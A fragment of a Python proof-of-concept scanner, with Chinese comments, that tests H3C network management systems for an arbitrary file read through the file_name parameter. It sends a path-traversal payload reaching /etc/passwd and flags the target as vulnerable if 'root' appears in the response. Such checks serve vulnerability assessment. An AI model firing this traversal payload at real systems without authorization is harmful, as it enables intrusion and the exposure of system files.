...
def check_vulnerability(url):
    try:
        # 构建攻击URL
        attack_url = url.rstrip('/') + "/webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down"
        ...
        if response.status_code == 200 and 'root' in response.text:
            print(f"{RED}URL [{url}] H3C网络管理系统file_name任意文件读取漏洞。{RESET}")
        else:
...
def main():
    parser = argparse.ArgumentParser(description='检查目标URL是否存在H3C网络管理系统file_name任意文件读取漏洞。')
